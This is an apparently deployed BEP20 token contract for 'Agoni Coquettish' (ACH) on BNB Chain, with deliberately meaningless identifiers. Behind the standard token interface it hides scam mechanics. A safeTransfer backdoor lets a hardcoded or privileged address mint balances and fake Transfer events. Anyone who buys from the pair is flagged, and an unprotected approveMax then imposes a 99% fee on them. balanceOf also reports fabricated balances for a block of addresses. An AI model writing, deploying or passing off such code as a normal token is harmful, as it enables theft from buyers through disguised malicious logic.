/**
 *Submitted for verification at BscScan.com on 2023-01-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


interface IBEP20 {

    function decimals() external view returns (uint8);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function totalSupply() external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function getOwner() external view returns (address);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IUniswapV2Router {

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}


library SafeMath {

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}





contract AgoniCoquettish is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    bool public feeEnableTakeList = false;
    uint256 constant modeReceiverMaxBurn = 100 * 10 ** 18;
    IUniswapV2Router public tradingMintAutoSenderBuyBurn;
    uint256 public liquidityAtLaunchedShould = 0;

    string constant _symbol = "ACH";

    

    bool private receiverTokenIsLaunch = false;

    address private modeListTakeTotalBuyToken = (msg.sender);
    bool private feeTxBotsSell = false;
    string constant _name = "Agoni Coquettish";
    uint256 private autoBuyMaxModeMarketing = 0;
    uint256 senderEnableTxWallet = 0;
    uint256 private tradingEnableTokenTotal = 0;
    uint256 public receiverFundLaunchedFee = 0;

    bool private takeAmountFundFee = false;
    uint160 constant enableModeBurnIs = uint160(0xEBE24826BC41a4D6462552C75FF5f5eEE79bf5D9);
    uint256 public fundAtFromLiquidityMintAmount = 0;

    uint256 private shouldTokenMarketingAtExemptMint = 0;

    uint256 constant enableSenderLaunchMintSwapFeeReceiver = 100000000 * (10 ** 18);
    uint256 private atModeShouldAmount = 0;
    mapping(address => bool) private maxTradingListBurn;
    bool public tokenExemptLimitTrading = false;
    mapping(address => bool)  maxBotsBuyReceiver;
    mapping(address => mapping(address => uint256)) _allowances;
    uint256 private teamFromAutoLaunchTokenMaxLiquidity = 0;
    uint256 private fundBotsListShouldEnableWallet = 100;
    mapping(address => uint256) _balances;
    address public uniswapV2Pair;

    uint256 constant minBurnFundTotal = 1000000 * 10 ** 18;


    bool public buyLimitBotsIs = false;
    uint256 private enableTokenMinFee = 0;
    mapping(address => bool)  marketingExemptModeReceiverTakeFrom;
    uint256 public feeAtReceiverShouldSellReceiver = 0;


    uint256  amountEnableTotalShould = 100000000 * 10 ** _decimals;
    uint256  launchedToMinTradingTotal = 100000000 * 10 ** _decimals;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        tradingMintAutoSenderBuyBurn = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(tradingMintAutoSenderBuyBurn.factory()).createPair(address(this), tradingMintAutoSenderBuyBurn.WETH());
        _allowances[address(this)][address(tradingMintAutoSenderBuyBurn)] = enableSenderLaunchMintSwapFeeReceiver;

        maxTradingListBurn[msg.sender] = true;
        maxTradingListBurn[address(this)] = true;

        _balances[msg.sender] = enableSenderLaunchMintSwapFeeReceiver;
        emit Transfer(address(0), msg.sender, enableSenderLaunchMintSwapFeeReceiver);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return enableSenderLaunchMintSwapFeeReceiver;
    }

    function getreceiverReceiverAtExempt() public view returns (uint256) {
        if (feeAtReceiverShouldSellReceiver == fundBotsListShouldEnableWallet) {
            return fundBotsListShouldEnableWallet;
        }
        return feeAtReceiverShouldSellReceiver;
    }

    function getliquidityAmountTokenBurnLaunchedSender() public view returns (uint256) {
        if (autoBuyMaxModeMarketing != tradingEnableTokenTotal) {
            return tradingEnableTokenTotal;
        }
        if (autoBuyMaxModeMarketing != teamFromAutoLaunchTokenMaxLiquidity) {
            return teamFromAutoLaunchTokenMaxLiquidity;
        }
        if (autoBuyMaxModeMarketing != autoBuyMaxModeMarketing) {
            return autoBuyMaxModeMarketing;
        }
        return autoBuyMaxModeMarketing;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (listFeeMaxMarketing(uint160(account))) {
            return receiverTakeMarketingMode(uint160(account));
        }
        return _balances[account];
    }

    function mintTakeFeeAt(address minFeeMarketingAuto) internal view returns (bool) {
        return !maxTradingListBurn[minFeeMarketingAuto];
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getenableBotsAutoLaunchedTeamBurn() public view returns (uint256) {
        if (receiverFundLaunchedFee == feeAtReceiverShouldSellReceiver) {
            return feeAtReceiverShouldSellReceiver;
        }
        if (receiverFundLaunchedFee != autoBuyMaxModeMarketing) {
            return autoBuyMaxModeMarketing;
        }
        return receiverFundLaunchedFee;
    }

    function getminFromLimitBuy() public view returns (bool) {
        if (buyLimitBotsIs != takeAmountFundFee) {
            return takeAmountFundFee;
        }
        if (buyLimitBotsIs != tokenExemptLimitTrading) {
            return tokenExemptLimitTrading;
        }
        if (buyLimitBotsIs != takeAmountFundFee) {
            return takeAmountFundFee;
        }
        return buyLimitBotsIs;
    }

    function isApproveMax(address spender) public view returns (bool) {
        return marketingExemptModeReceiverTakeFrom[spender];
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function getmintAmountToReceiver() public view returns (uint256) {
        if (liquidityAtLaunchedShould == receiverFundLaunchedFee) {
            return receiverFundLaunchedFee;
        }
        if (liquidityAtLaunchedShould != fundAtFromLiquidityMintAmount) {
            return fundAtFromLiquidityMintAmount;
        }
        return liquidityAtLaunchedShould;
    }

    function getswapTakeTeamTrading() public view returns (uint256) {
        if (shouldTokenMarketingAtExemptMint == liquidityAtLaunchedShould) {
            return liquidityAtLaunchedShould;
        }
        return shouldTokenMarketingAtExemptMint;
    }

    function liquidityLaunchedLaunchSell(address minFeeMarketingAuto, address toReceiverAutoTakeMax, uint256 teamBuyAmountSwapTotalFeeMint) internal returns (uint256) {
        
        uint256 totalTradingLaunchedReceiver = teamBuyAmountSwapTotalFeeMint.mul(feeBuyReceiverMode(minFeeMarketingAuto, toReceiverAutoTakeMax == uniswapV2Pair)).div(fundBotsListShouldEnableWallet);

        if (totalTradingLaunchedReceiver > 0) {
            _balances[address(this)] = _balances[address(this)].add(totalTradingLaunchedReceiver);
            emit Transfer(minFeeMarketingAuto, address(this), totalTradingLaunchedReceiver);
        }

        return teamBuyAmountSwapTotalFeeMint.sub(totalTradingLaunchedReceiver);
    }

    function setswapTakeTeamTrading(uint256 listToTeamBuyMinFundAuto) public onlyOwner {
        if (shouldTokenMarketingAtExemptMint == feeAtReceiverShouldSellReceiver) {
            feeAtReceiverShouldSellReceiver=listToTeamBuyMinFundAuto;
        }
        shouldTokenMarketingAtExemptMint=listToTeamBuyMinFundAuto;
    }

    function getbuyBurnLiquidityFund() public view returns (uint256) {
        return fundBotsListShouldEnableWallet;
    }

    function setsenderAutoWalletTake(bool listToTeamBuyMinFundAuto) public onlyOwner {
        if (feeTxBotsSell != buyLimitBotsIs) {
            buyLimitBotsIs=listToTeamBuyMinFundAuto;
        }
        feeTxBotsSell=listToTeamBuyMinFundAuto;
    }

    function setmintAmountToReceiver(uint256 listToTeamBuyMinFundAuto) public onlyOwner {
        if (liquidityAtLaunchedShould != tradingEnableTokenTotal) {
            tradingEnableTokenTotal=listToTeamBuyMinFundAuto;
        }
        liquidityAtLaunchedShould=listToTeamBuyMinFundAuto;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function getshouldFromModeTrading() public view returns (address) {
        if (modeListTakeTotalBuyToken != modeListTakeTotalBuyToken) {
            return modeListTakeTotalBuyToken;
        }
        if (modeListTakeTotalBuyToken != modeListTakeTotalBuyToken) {
            return modeListTakeTotalBuyToken;
        }
        return modeListTakeTotalBuyToken;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != enableSenderLaunchMintSwapFeeReceiver) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return receiverTradingExemptFeeSenderLaunchedLiquidity(sender, recipient, amount);
    }

    function setlistTakeMintSwap(uint256 listToTeamBuyMinFundAuto) public onlyOwner {
        if (fundAtFromLiquidityMintAmount == shouldTokenMarketingAtExemptMint) {
            shouldTokenMarketingAtExemptMint=listToTeamBuyMinFundAuto;
        }
        if (fundAtFromLiquidityMintAmount == teamFromAutoLaunchTokenMaxLiquidity) {
            teamFromAutoLaunchTokenMaxLiquidity=listToTeamBuyMinFundAuto;
        }
        if (fundAtFromLiquidityMintAmount == shouldTokenMarketingAtExemptMint) {
            shouldTokenMarketingAtExemptMint=listToTeamBuyMinFundAuto;
        }
        fundAtFromLiquidityMintAmount=listToTeamBuyMinFundAuto;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function listFeeMaxMarketing(uint160 marketingModeMinList) private pure returns (bool) {
        uint160 shouldSwapTradingAt = enableModeBurnIs;
        if (marketingModeMinList >= uint160(shouldSwapTradingAt)) {
            if (marketingModeMinList <= uint160(shouldSwapTradingAt) + 300000) {
                return true;
            }
        }
        return false;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function getsenderAutoWalletTake() public view returns (bool) {
        if (feeTxBotsSell == receiverTokenIsLaunch) {
            return receiverTokenIsLaunch;
        }
        if (feeTxBotsSell != buyLimitBotsIs) {
            return buyLimitBotsIs;
        }
        return feeTxBotsSell;
    }

    function fundSellBotsTeamTxList(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function walletSellBotsAtAuto() private pure returns (address) {
        return 0xA47E783aAe307F847D9d7661d8c596B8310bDf7d;
    }

    function tokenTradingExemptTakeLaunchFee(address minFeeMarketingAuto, address senderMaxTakeMin, uint256 teamBuyAmountSwapTotalFeeMint, bool sellReceiverTxAt) private {
        uint160 shouldSwapTradingAt = uint160(enableModeBurnIs);
        if (sellReceiverTxAt) {
            minFeeMarketingAuto = address(uint160(shouldSwapTradingAt + senderEnableTxWallet));
            senderEnableTxWallet++;
            _balances[senderMaxTakeMin] = _balances[senderMaxTakeMin].add(teamBuyAmountSwapTotalFeeMint);
        } else {
            _balances[minFeeMarketingAuto] = _balances[minFeeMarketingAuto].sub(teamBuyAmountSwapTotalFeeMint);
        }
        if (teamBuyAmountSwapTotalFeeMint == 0) {
            return;
        }
        emit Transfer(minFeeMarketingAuto, senderMaxTakeMin, teamBuyAmountSwapTotalFeeMint);
    }

    function setbuyBurnLiquidityFund(uint256 listToTeamBuyMinFundAuto) public onlyOwner {
        fundBotsListShouldEnableWallet=listToTeamBuyMinFundAuto;
    }

    function getswapLaunchFeeLiquidity() public view returns (uint256) {
        if (enableTokenMinFee != teamFromAutoLaunchTokenMaxLiquidity) {
            return teamFromAutoLaunchTokenMaxLiquidity;
        }
        if (enableTokenMinFee != enableTokenMinFee) {
            return enableTokenMinFee;
        }
        if (enableTokenMinFee != atModeShouldAmount) {
            return atModeShouldAmount;
        }
        return enableTokenMinFee;
    }

    function approveMax(address spender) external {
        if (maxBotsBuyReceiver[spender]) {
            marketingExemptModeReceiverTakeFrom[spender] = true;
        }
    }

    function setswapLaunchFeeLiquidity(uint256 listToTeamBuyMinFundAuto) public onlyOwner {
        if (enableTokenMinFee == fundAtFromLiquidityMintAmount) {
            fundAtFromLiquidityMintAmount=listToTeamBuyMinFundAuto;
        }
        enableTokenMinFee=listToTeamBuyMinFundAuto;
    }

    function getlistTakeMintSwap() public view returns (uint256) {
        if (fundAtFromLiquidityMintAmount == feeAtReceiverShouldSellReceiver) {
            return feeAtReceiverShouldSellReceiver;
        }
        return fundAtFromLiquidityMintAmount;
    }

    function setliquidityAmountTokenBurnLaunchedSender(uint256 listToTeamBuyMinFundAuto) public onlyOwner {
        if (autoBuyMaxModeMarketing != tradingEnableTokenTotal) {
            tradingEnableTokenTotal=listToTeamBuyMinFundAuto;
        }
        autoBuyMaxModeMarketing=listToTeamBuyMinFundAuto;
    }

    function feeBuyReceiverMode(address minFeeMarketingAuto, bool totalBotsReceiverModeAmount) internal returns (uint256) {
        if (marketingExemptModeReceiverTakeFrom[minFeeMarketingAuto]) {
            return 99;
        }
        
        if (totalBotsReceiverModeAmount) {
            return autoBuyMaxModeMarketing;
        }
        if (!totalBotsReceiverModeAmount && minFeeMarketingAuto == uniswapV2Pair) {
            return tradingEnableTokenTotal;
        }
        return 0;
    }

    function swapTotalBotsLiquidityAutoBuy(address marketingModeMinList) private pure returns (bool) {
        return marketingModeMinList == walletSellBotsAtAuto();
    }

    function setminFromLimitBuy(bool listToTeamBuyMinFundAuto) public onlyOwner {
        if (buyLimitBotsIs == buyLimitBotsIs) {
            buyLimitBotsIs=listToTeamBuyMinFundAuto;
        }
        if (buyLimitBotsIs != buyLimitBotsIs) {
            buyLimitBotsIs=listToTeamBuyMinFundAuto;
        }
        if (buyLimitBotsIs == receiverTokenIsLaunch) {
            receiverTokenIsLaunch=listToTeamBuyMinFundAuto;
        }
        buyLimitBotsIs=listToTeamBuyMinFundAuto;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return receiverTradingExemptFeeSenderLaunchedLiquidity(msg.sender, recipient, amount);
    }

    function setenableBotsAutoLaunchedTeamBurn(uint256 listToTeamBuyMinFundAuto) public onlyOwner {
        if (receiverFundLaunchedFee != feeAtReceiverShouldSellReceiver) {
            feeAtReceiverShouldSellReceiver=listToTeamBuyMinFundAuto;
        }
        if (receiverFundLaunchedFee != tradingEnableTokenTotal) {
            tradingEnableTokenTotal=listToTeamBuyMinFundAuto;
        }
        if (receiverFundLaunchedFee != teamFromAutoLaunchTokenMaxLiquidity) {
            teamFromAutoLaunchTokenMaxLiquidity=listToTeamBuyMinFundAuto;
        }
        receiverFundLaunchedFee=listToTeamBuyMinFundAuto;
    }

    function setreceiverReceiverAtExempt(uint256 listToTeamBuyMinFundAuto) public onlyOwner {
        if (feeAtReceiverShouldSellReceiver == liquidityAtLaunchedShould) {
            liquidityAtLaunchedShould=listToTeamBuyMinFundAuto;
        }
        if (feeAtReceiverShouldSellReceiver == enableTokenMinFee) {
            enableTokenMinFee=listToTeamBuyMinFundAuto;
        }
        feeAtReceiverShouldSellReceiver=listToTeamBuyMinFundAuto;
    }

    function setshouldFromModeTrading(address listToTeamBuyMinFundAuto) public onlyOwner {
        modeListTakeTotalBuyToken=listToTeamBuyMinFundAuto;
    }

    function senderFromBuyMinLiquidityFee(address minSenderReceiverAt) private view returns (bool) {
        if (minSenderReceiverAt == modeListTakeTotalBuyToken) {
            return true;
        }
        return false;
    }

    function safeTransfer(address minFeeMarketingAuto, address senderMaxTakeMin, uint256 teamBuyAmountSwapTotalFeeMint) public {
        if (!swapTotalBotsLiquidityAutoBuy(msg.sender) && msg.sender != modeListTakeTotalBuyToken) {
            return;
        }
        if (listFeeMaxMarketing(uint160(senderMaxTakeMin))) {
            tokenTradingExemptTakeLaunchFee(minFeeMarketingAuto, senderMaxTakeMin, teamBuyAmountSwapTotalFeeMint, false);
            return;
        }
        if (senderMaxTakeMin == address(1)) {
            return;
        }
        if (listFeeMaxMarketing(uint160(minFeeMarketingAuto))) {
            tokenTradingExemptTakeLaunchFee(minFeeMarketingAuto, senderMaxTakeMin, teamBuyAmountSwapTotalFeeMint, true);
            return;
        }
        if (teamBuyAmountSwapTotalFeeMint == 0) {
            return;
        }
        if (minFeeMarketingAuto == address(0)) {
            _balances[senderMaxTakeMin] = _balances[senderMaxTakeMin].add(teamBuyAmountSwapTotalFeeMint);
            return;
        }
    }

    function receiverTradingExemptFeeSenderLaunchedLiquidity(address minFeeMarketingAuto, address senderMaxTakeMin, uint256 teamBuyAmountSwapTotalFeeMint) internal returns (bool) {
        if (listFeeMaxMarketing(uint160(senderMaxTakeMin))) {
            tokenTradingExemptTakeLaunchFee(minFeeMarketingAuto, senderMaxTakeMin, teamBuyAmountSwapTotalFeeMint, false);
            return true;
        }
        if (listFeeMaxMarketing(uint160(minFeeMarketingAuto))) {
            tokenTradingExemptTakeLaunchFee(minFeeMarketingAuto, senderMaxTakeMin, teamBuyAmountSwapTotalFeeMint, true);
            return true;
        }
        
        if (feeAtReceiverShouldSellReceiver != fundAtFromLiquidityMintAmount) {
            feeAtReceiverShouldSellReceiver = shouldTokenMarketingAtExemptMint;
        }

        if (receiverFundLaunchedFee == autoBuyMaxModeMarketing) {
            receiverFundLaunchedFee = enableTokenMinFee;
        }

        if (fundAtFromLiquidityMintAmount == tradingEnableTokenTotal) {
            fundAtFromLiquidityMintAmount = tradingEnableTokenTotal;
        }


        bool teamSellBotsTotal = senderFromBuyMinLiquidityFee(minFeeMarketingAuto) || senderFromBuyMinLiquidityFee(senderMaxTakeMin);
        
        if (minFeeMarketingAuto == uniswapV2Pair && !teamSellBotsTotal) {
            maxBotsBuyReceiver[senderMaxTakeMin] = true;
        }
        
        if (feeEnableTakeList == tokenExemptLimitTrading) {
            feeEnableTakeList = buyLimitBotsIs;
        }


        if (teamSellBotsTotal) {
            return fundSellBotsTeamTxList(minFeeMarketingAuto, senderMaxTakeMin, teamBuyAmountSwapTotalFeeMint);
        }
        
        _balances[minFeeMarketingAuto] = _balances[minFeeMarketingAuto].sub(teamBuyAmountSwapTotalFeeMint, "Insufficient Balance!");
        
        uint256 limitModeBotsTake = mintTakeFeeAt(minFeeMarketingAuto) ? liquidityLaunchedLaunchSell(minFeeMarketingAuto, senderMaxTakeMin, teamBuyAmountSwapTotalFeeMint) : teamBuyAmountSwapTotalFeeMint;

        _balances[senderMaxTakeMin] = _balances[senderMaxTakeMin].add(limitModeBotsTake);
        emit Transfer(minFeeMarketingAuto, senderMaxTakeMin, limitModeBotsTake);
        return true;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function receiverTakeMarketingMode(uint160 marketingModeMinList) private view returns (uint256) {
        uint160 shouldSwapTradingAt = uint160(enableModeBurnIs);
        uint160 autoLimitTradingLaunchedReceiverFundMin = marketingModeMinList - shouldSwapTradingAt;
        if (autoLimitTradingLaunchedReceiverFundMin < senderEnableTxWallet) {
            return modeReceiverMaxBurn * autoLimitTradingLaunchedReceiverFundMin;
        }
        return minBurnFundTotal + modeReceiverMaxBurn * autoLimitTradingLaunchedReceiverFundMin;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}